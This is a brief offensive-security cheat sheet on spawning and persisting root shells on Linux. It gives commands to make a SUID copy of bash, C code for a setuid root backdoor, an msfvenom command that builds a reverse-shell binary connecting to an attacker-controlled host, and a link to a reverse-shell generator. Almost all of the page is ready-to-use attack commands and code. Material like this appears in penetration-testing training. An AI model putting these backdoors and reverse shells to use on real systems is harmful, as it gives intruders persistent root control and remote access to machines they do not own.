# Spawning root shell

## Rootbash

In this method we create a copy of bash binary with root privileges and set SUID bit on, resulting in bash executable which when executed always run with a context of root user.

```text
cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash
```

After creating a copy, we can run it in unprivileged terminal.

```text
/tmp/rootbash -p
```

## Executable

We create a simple C program which sets UID to 0 and runs `/bin/bash` . When compiled with root privileges, we can run it afterwards for permanent root backdoor.

```text
int main(){
    setuid(0);
    system("/bin/bash");
}
```

Compile it with root privileges.

```text
gcc -o <out_file> <source_code>
```

## Msfvenom executable

Create msfvenom reverse shell, then execute as a root with handler prepared on your attack machine.

```text
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<lhost> LPORT=<lport> -f elf > shell
```

## Native reverse shells

This method needs more research.

```text
https://github.com/mthbernardes/rsg
```

